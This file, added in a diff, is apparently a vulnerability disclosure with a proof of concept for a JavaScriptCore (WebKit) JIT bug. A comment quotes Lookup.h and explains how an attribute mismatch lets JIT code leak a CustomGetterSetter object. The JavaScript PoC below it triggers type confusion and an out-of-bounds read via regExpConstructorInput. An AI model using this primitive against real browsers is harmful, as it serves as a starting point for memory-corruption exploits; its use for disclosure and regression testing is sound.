@@ -1,0 +1,62 @@
+/*
+https://github.com/WebKit/webkit/blob/3fff8c40c665a09de5e3ede46fc35908f69353c3/Source/JavaScriptCore/runtime/Lookup.h#L392
+
+    if (value.attributes() & PropertyAttribute::PropertyCallback) {
+        JSValue result = value.lazyPropertyCallback()(vm, &thisObj);
+        thisObj.putDirect(vm, propertyName, result, attributesForStructure(value.attributes()));
+        return;
+    }
+
+    if (value.attributes() & PropertyAttribute::DOMJITAttribute) {
+        ASSERT_WITH_MESSAGE(classInfo, "DOMJITAttribute should have class info for type checking.");
+        const DOMJIT::GetterSetter* domJIT = value.domJIT();
+        auto* customGetterSetter = DOMAttributeGetterSetter::create(vm, domJIT->getter(), value.propertyPutter(), DOMAttributeAnnotation { classInfo, domJIT });
+        thisObj.putDirectCustomAccessor(vm, propertyName, customGetterSetter, attributesForStructure(value.attributes()));
+        return;
+    }
+
+    if (value.attributes() & PropertyAttribute::DOMAttribute) {
+        ASSERT_WITH_MESSAGE(classInfo, "DOMAttribute should have class info for type checking.");
+        auto* customGetterSetter = DOMAttributeGetterSetter::create(vm, value.propertyGetter(), value.propertyPutter(), DOMAttributeAnnotation { classInfo, nullptr });
+        thisObj.putDirectCustomAccessor(vm, propertyName, customGetterSetter, attributesForStructure(value.attributes()));
+        return;
+    }
+
+    CustomGetterSetter* customGetterSetter = CustomGetterSetter::create(vm, value.propertyGetter(), value.propertyPutter());
+    thisObj.putDirectCustomAccessor(vm, propertyName, customGetterSetter, attributesForStructure(value.attributes()));
+
+It's possible that the given property's attributes variable "value.attributes()" doesn't contain PropertyAttribute::CustomAccessor. In that case, a mismatch between the value of the property and its attributes occurs. When handling a property access operation, the normal interpreter sees the type of the value whereas the JIT compiler sees the attributes. So we can use JITed code to pull out the CustomGetterSetter object to the JavaScript world. The PoC demonstrates type confusion and an OOB read using a CustomGetterSetter object linked to regExpConstructorInput.
+
+PoC:
+*/
+
+function opt(o) {
+    return o.r.input;
+}
+
+Object.assign({}, RegExp);  // Reifying
+
+for (let i = 0; i < 200000; i++) {
+    opt({r: RegExp});
+}
+
+let input = opt({r: RegExp});   // Pulling the CustomGetterSetter object.
+
+let o = {
+    a0: 0x1234,
+    a1: 0x1234,
+    a2: 0x1234,
+    a3: 0x1234,
+    a4: 0x1234,
+    a5: 0x1234,
+    a6: 0x1234,
+    a7: 0x1234,
+    a8: 0x1234,
+    a9: 0x1234,
+    a10: 0x1234,
+    a11: 0x1234,
+}
+
+o.input = input;
+
+print(o.input);  // The normal interpreter doesn't see the attributes, so it will just call the underneath getter using callCustomGetter.
